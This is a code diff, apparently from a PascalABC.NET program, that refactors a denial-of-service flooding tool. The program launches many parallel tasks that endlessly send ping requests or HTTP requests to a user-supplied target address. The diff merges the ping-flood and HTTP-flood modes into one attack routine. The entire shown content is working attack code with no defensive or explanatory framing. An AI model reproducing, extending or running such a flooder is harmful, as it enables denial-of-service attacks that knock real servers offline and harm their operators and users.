@@ -11,12 +11,12 @@ type
     constructor(f: procedure) ;
     begin
       workload := f;
-      thread_sum += 1;
     end;
     
     function load: boolean;
     begin
       workload;
+      thread_sum += 1;
       Result := true;
     end;
   end;
@@ -44,26 +44,25 @@ begin
   Close(save_file);
 end;
 
-procedure ping_flood_attack();
-var
-  pg: Ping;
+procedure ping_flood_attack;
 begin
-  pg := new Ping();
-  res := pg.Send(address);
+  (new Ping()).Send(address);
 end;
 
-procedure http_flood_attack();
-var
-  w: WebClient;
+procedure http_flood_attack;
 begin
-  w := new WebClient();
-  w.DownloadString(address);
+  (new WebClient()).DownloadString(address);
 end;
 
-procedure attack(pr: procedure);
+procedure attack(ta: shortint);
 begin
-  for var i := 0 to tb.Length - 1 do
-    tb[i] := Task.Factory.StartNew((new thread(pr)).load);
+  log('Start attack type ' + ta + ' on ' + address);
+  if (ta = 0) then
+    for var i := 0 to tb.Length - 1 do
+      tb[i] := Task.Factory.StartNew((new thread(ping_flood_attack)).load)
+  else if (ta = 1) then
+    for var i := 0 to tb.Length - 1 do
+      tb[i] := Task.Factory.StartNew((new thread(http_flood_attack)).load);
   if tb[tb.Length - 1].Result then
   begin
     GotoXY(1, 7);
@@ -122,20 +121,8 @@ begin
     Writeln('Type    : ' + type_attack + ' ([0] - ping-flood; [1] - HTTP-flood)');
     Writeln('Threads : ' + thread_k);
     t := Milliseconds;
-    case type_attack of
-      0:
-        begin
-          log('Start ping-flood attack ' + address);
-          while true do
-            attack(ping_flood_attack);
-        end;
-      1:
-        begin
-          log('Start HTTP-flood attack ' + address);
-          while true do
-            attack(http_flood_attack);
-        end;
-    end;
+    while true do
+      attack(type_attack);
   except
     on e: Exception do
     begin
